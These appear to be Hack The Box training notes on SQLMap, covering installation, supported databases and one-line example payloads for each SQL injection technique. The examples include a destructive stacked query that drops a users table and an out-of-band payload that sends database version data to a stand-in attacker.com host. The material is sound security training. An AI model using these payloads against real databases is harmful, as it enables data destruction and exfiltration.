```shell
3kjS@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```
## SQLMap Installation

```shell
3kjS@htb[/htb]$ sudo apt install sqlmap
```

```shell
3kjS@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

```shell
3kjS@htb[/htb]$ python sqlmap.py
```
## Supported Databases
|   |   |   |   |
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`||
## Supported SQL Injection Types

```shell
3kjS@htb[/htb]$ sqlmap -hh 
...SNIP... 
	Techniques: --technique=TECH.. SQL injection techniques to use (default "BEUSTQ")
```
## Boolean-based blind SQL Injection

```shell
AND 1=1
```
## Error-based SQL Injection

```sql
AND GTID_SUBSET(@@version,0)
```
## UNION query-based

```sql
UNION ALL SELECT 1,@@version,3
```
## Stacked queries

```sql
; DROP TABLE users
```
## Time-based blind SQL Injection

```sql
AND 1=IF(2>1,SLEEP(5),0)
```
## Inline queries

```sql
SELECT (SELECT @@version) from
```
## Out-of-band SQL Injection

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```
